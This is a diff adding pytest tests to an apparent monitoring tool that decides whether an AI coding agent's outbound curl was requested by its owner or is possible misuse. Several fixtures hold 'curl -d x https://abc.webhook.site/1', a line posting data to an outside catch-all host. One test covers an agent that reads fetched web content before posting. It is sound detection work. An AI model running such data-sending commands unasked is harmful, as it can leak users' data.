@@ -101,7 +101,7 @@ def test_owner_asked_for_it(tmp_path):
                                     tool_result(T0 - 230)])
     f = transcript_facts(p, {"webhook.site", "abc.webhook.site"}, T0)
     assert f == {"transcript": True, "agent_named_dest": True, "agent_busy": False, "minutes_since_prompt": 1,
-                 "owner_named_dest": True, "outside_content": False,
+                 "owner_named_dest": True, "outside_content": False, "matched_by": "name",
                  "agent_command": "curl -d x https://abc.webhook.site/1"}
 
 
@@ -870,12 +870,94 @@ def test_gone_curl_under_an_agent_thread_without_markers_is_still_the_agents(tmp
     hc = HostContext(PC, None, [log], str(tmp_path / "t"))
     facts = hc.collect(case(indicators=[]), [out_conn(T0)], [], now=T0 + 3600)
     assert facts["host_who"] == "owner_using_agent" and not facts["host_corroborated"]
+    assert facts["host_matched_by"] == "ip"   # the case has no name, so the address was the fallback needle
     assert facts["host_agent_session"] and facts["host_session"] == SID and facts["host_inherited"]
     assert not facts["host_transcript_only"] and facts["host_session_guessed"]
     assert not facts["host_attended_known"] and not facts["host_attended"]   # unknown, not "nobody"
     from tapwatch.summarizer import Assets, summarize
     text = summarize(case(indicators=[], facts={"channel": "callback", "via": "DNS", **facts}), Assets())
     assert "attendance could not be read" in text and "nobody was attending" not in text
+    assert "by address, not by name" in text
+
+
+def agent_thread_log(tmp_path, **thread_cols):
+    """The measured shape (#376): a claude thread with no markers spawned the shell that ran a one-second curl."""
+    cols = {"claude_session": "", "claude_attended": "", "claude_entrypoint": "", "in_herdr": "0", **thread_cols}
+    return write_rows(tmp_path, [bpf(T0 - 30, path=CLAUDE, pid="4000", parent="3000", parent_name="JITWorker",
+                                     remote="198.51.100.7", **cols),
+                                 exec_row(T0 - 5, 4290, 4000, "/usr/bin/bash"),
+                                 exec_row(T0 - 4, 4300, 4290, "/usr/bin/curl"),
+                                 gone_curl(T0)])
+
+
+def test_chain_only_owner_is_corroborated_when_the_owners_prompt_names_the_destination(tmp_path):
+    # Measured 2026-10-16/17: 84 cases with host context, 0 corroborated, because markers live only on the agent's
+    # child shells. The owner typing the name in their own prompt is the corroboration; attendance stays unknown.
+    log = agent_thread_log(tmp_path)
+    write_transcript(tmp_path / "t", [prompt(T0 - 60, "post the sample to webhook.site and show me the reply"),
+                                      tool(T0 - 1, "Bash", {"command": "curl -d x https://abc.webhook.site/1"})])
+    hc = HostContext(PC, None, [log], str(tmp_path / "t"))
+    facts = hc.collect(case(), [out_conn(T0)], [], now=T0 + 3600)
+    assert facts["host_who"] == "owner_using_agent" and facts["host_corroborated"]
+    assert facts["host_matched_by"] == "name" and facts["host_session_guessed"]
+    assert facts["host_session"] == SID and not facts["host_attended_known"]
+    # the router lowers it (no Jev, or Jev agreeing) and still lists the unread attendance as a risk
+    from tapwatch.router import agent_risks
+    c = case(facts={"channel": "callback", "via": "DNS", **facts}, base_severity=3)
+    assert route(c, None)[0] is Route.LOG
+    assert any("attendance could not be read" in r for r in agent_risks(facts))
+    assert "the agent read outside content first" not in agent_risks({**facts, "host_outside_content": True})
+    c.facts.update(host_jev_who="agent_misused", host_jev_conf=0.9)
+    assert route(c, None)[0] is Route.ALERT
+    text = summarize(c, Assets())
+    assert "best guess" in text and "attendance could not be read" in text
+
+
+def test_address_only_mention_does_not_match_a_named_case(tmp_path):
+    # #379 (www.ietf.org): the transcript mentioned a shared Cloudflare address, never the site's name.
+    log = agent_thread_log(tmp_path)
+    write_transcript(tmp_path / "t", [prompt(T0 - 60, f"curl {DST} every minute as a heartbeat"),
+                                      tool(T0 - 1, "Bash", {"command": f"curl -s https://{DST}/"})])
+    hc = HostContext(PC, None, [log], str(tmp_path / "t"))
+    facts = hc.collect(case(), [out_conn(T0)], [], now=T0 + 3600)
+    assert not facts.get("host_agent_named_dest") and "host_matched_by" not in facts
+    assert facts["host_who"] == "agent_unconfirmed" and not facts["host_corroborated"]
+    assert not facts["host_session_guessed"] and facts["host_session"] == ""
+
+
+def test_chain_only_owner_with_an_ip_match_stays_uncorroborated(tmp_path):
+    # a case with no name at all (no indicators, no DNS rows) still matches by address, but that is never proof
+    log = agent_thread_log(tmp_path)
+    write_transcript(tmp_path / "t", [prompt(T0 - 60, f"curl {DST} every minute as a heartbeat"),
+                                      tool(T0 - 1, "Bash", {"command": f"curl -s https://{DST}/"})])
+    hc = HostContext(PC, None, [log], str(tmp_path / "t"))
+    facts = hc.collect(case(indicators=[]), [out_conn(T0)], [], now=T0 + 3600)
+    assert facts["host_matched_by"] == "ip" and facts["host_owner_named_dest"]
+    assert facts["host_who"] == "owner_using_agent" and not facts["host_corroborated"]
+
+
+@pytest.mark.parametrize("cols", [{"claude_attended": "0"}, {"via_ssh": "1"}])
+def test_chain_only_owner_unattended_or_over_ssh_is_still_misuse(tmp_path, cols):
+    log = agent_thread_log(tmp_path, **cols)
+    write_transcript(tmp_path / "t", [prompt(T0 - 60, "post the sample to webhook.site"),
+                                      tool(T0 - 1, "Bash", {"command": "curl -d x https://abc.webhook.site/1"})])
+    hc = HostContext(PC, None, [log], str(tmp_path / "t"))
+    facts = hc.collect(case(), [out_conn(T0)], [], now=T0 + 3600)
+    assert facts["host_matched_by"] == "name" and facts["host_owner_named_dest"]
+    assert facts["host_who"] == "agent_misused" and not facts["host_corroborated"]
+
+
+def test_chain_only_owner_who_read_outside_content_first_is_not_corroborated(tmp_path):
+    log = agent_thread_log(tmp_path)
+    write_transcript(tmp_path / "t", [prompt(T0 - 300, "post the sample to webhook.site"),
+                                      tool(T0 - 200, "WebFetch", {"url": "https://example.com/readme"}),
+                                      tool_result(T0 - 190),
+                                      tool(T0 - 1, "Bash", {"command": "curl -d x https://abc.webhook.site/1"})])
+    hc = HostContext(PC, None, [log], str(tmp_path / "t"))
+    facts = hc.collect(case(), [out_conn(T0)], [], now=T0 + 3600)
+    assert facts["host_matched_by"] == "name" and facts["host_outside_content"]
+    assert facts["host_who"] == "owner_using_agent" and not facts["host_corroborated"]
+    assert route(case(facts={"channel": "callback", "via": "DNS", **facts}, base_severity=3), None)[0] is not Route.LOG
 
 
 def test_a_reused_agent_thread_id_does_not_credit_a_later_process(tmp_path):
